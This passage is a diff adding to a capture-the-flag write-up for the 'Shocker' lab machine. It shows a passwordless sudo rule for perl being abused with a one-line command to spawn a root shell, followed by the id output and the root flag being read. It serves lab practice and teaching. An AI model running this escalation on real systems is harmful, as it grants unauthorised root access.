@@ -343,3 +343,23 @@ User shelly may run the following commands on Shocker:
     (root) NOPASSWD: /usr/bin/perl
 ```
 Ooh! We can run `perl` as root. If this fails, we could probably look at SUID configurations or services or things like that.
+
+From online references, here is where I learnt you can launch a shell using `perl`.
+```
+id
+uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
+sudo perl -e 'exec("/bin/bash")'
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+Simply by running `sudo perl -e 'exec("/bin/bash")'`, we got root privileges.
+
+Let's find the root flags.
+```
+pwd
+/root
+ls
+root.txt
+cat root.txt
+827704ec5f851e6b2a7c3b895f1e044f
+```
